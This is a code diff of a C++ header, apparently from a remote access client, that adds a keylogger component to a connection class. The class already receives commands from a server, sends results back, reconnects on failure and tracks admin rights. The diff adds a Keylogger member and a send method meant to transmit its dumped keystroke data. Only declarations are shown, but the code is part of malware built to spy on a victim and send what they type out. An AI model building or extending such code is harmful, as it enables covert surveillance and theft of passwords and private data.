@@ -2,6 +2,7 @@
 #define CONNEXION_H
 
 #include "master.h"
+#include "../inc/Keylogger.h"
 
 using namespace std;
 
@@ -22,9 +23,10 @@ class Connexion
 
 
         INT main(); //Main function of client. #3
-        VOID sendSafe(vector<string> result_of_command); //send data and manage errors
+        VOID sendCommandSafe(vector<string> result_of_command, BOOL encryptedData=TRUE); //send data and manage errors | encryptedData use for keylogger->dumpAllData
+        VOID sendSafe(wstring data);
         wstring recvSafe(); //receives the data and manages possible errors.  and return result
-        VOID checkSend(INT &iResult);
+        VOID checkSend(INT &status);
         
         VOID reConnect(); //re connection to the server in case of problem.
         VOID closeConnexion(); //Close connexion.
@@ -34,11 +36,11 @@ class Connexion
 
     private:
 
-        SOCKET sock_client; 
+        SOCKET a_sock; 
         wstring a_token;
         BOOL a_is_admin;
         wstring a_path_prog;
-
+        Keylogger *a_keylogger = new Keylogger;
 };
 #endif
 
